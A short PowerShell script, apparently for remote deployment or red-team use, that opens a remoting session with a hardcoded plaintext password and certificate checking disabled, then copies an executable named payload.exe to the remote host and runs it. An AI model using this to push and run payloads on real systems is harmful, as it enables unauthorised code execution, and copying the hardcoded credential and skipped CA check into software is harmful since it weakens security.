$password = ConvertTo-SecureString "Changeme123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("psremote", $password)
$name = "myHost"
$sessOptions = New-PSSessionOption -SkipCACheck
$session = New-PSSession -ComputerName $name -UseSSL -Credential $cred -SessionOption $sessOptions
Copy-Item -Path .\payload.exe -Destination C:\payload.exe -ToSession $session
Invoke-Command -Session $session -ScriptBlock {Start-Process -filepath 'C:\payload.exe'}
